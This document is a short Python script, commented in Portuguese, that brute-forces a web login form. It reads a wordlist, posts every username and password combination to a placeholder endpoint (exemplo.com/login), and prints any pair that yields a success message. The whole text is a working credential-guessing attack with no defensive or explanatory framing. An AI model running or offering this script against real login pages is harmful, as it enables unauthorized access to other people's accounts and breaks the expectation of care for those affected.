import requests

# URL do endpoint de autenticação
url = 'http://exemplo.com/login'

# Carrega a lista de usuários e senhas
with open('wordlist.txt', 'r') as f:
    wordlist = f.readlines()

# Remove espaços em branco e quebras de linha das strings
wordlist = [w.strip() for w in wordlist]

# Itera sobre cada combinação de usuário e senha
for user in wordlist:
    for pwd in wordlist:
        # Cria o payload do POST com os dados de autenticação
        data = {'username': user, 'password': pwd}

        # Faz o POST para o endpoint de autenticação
        r = requests.post(url, data=data)

        # Verifica se a autenticação foi bem-sucedida
        if r.status_code == 200 and 'Login bem-sucedido' in r.text:
            print(f'Senha correta encontrada para o usuário {user}: {pwd}')
            break
